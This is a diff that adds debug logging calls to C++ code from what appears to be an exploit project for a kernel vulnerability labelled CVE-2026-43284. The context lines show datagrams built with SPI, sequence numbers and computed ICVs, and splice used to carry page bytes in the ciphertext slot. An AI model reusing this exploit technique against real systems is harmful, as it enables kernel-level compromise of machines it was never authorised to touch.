@@ -18,6 +18,7 @@
  *  needed: the table measured that the old value was a code default with no other writer, and a
  *  protocol constant is not a setting.
  */
+#include "jni/gl_log.hpp"
 #include <array>
 #include <cstddef>
 #include <cstdint>
@@ -147,6 +148,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             std::array<std::uint8_t, kMaxDatagramBytes> datagram{};
             store_be32(datagram.data(), spi_);
             store_be32(datagram.data() + 4U, next_seq_);
+            GL_LOGI("window: sending seq=%u window=%p", next_seq_, static_cast<const void *>(this));
             /* The check covers what the wire will carry, and the wire carries the page's own bytes in
              * the ciphertext slot -- splice_one substitutes them there. Putting the desired block in
              * this slot instead would authenticate bytes nobody sends, and the kernel, which verifies
@@ -159,6 +161,8 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             splice_.compute_icv(datagram.data(), prefix, hmac_key_, icv_len_,
                                 datagram.data() + prefix);
             if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
+                GL_LOGI("window: splice NOT sent offset=%llu err=%d seq=%u (20=hdr 21=page 22=len 23=suffix)",
+                        static_cast<unsigned long long>(position), splice_.last_error(), next_seq_);
                 outcome_ = WriteOutcome::NotSent;
                 return false;
             }
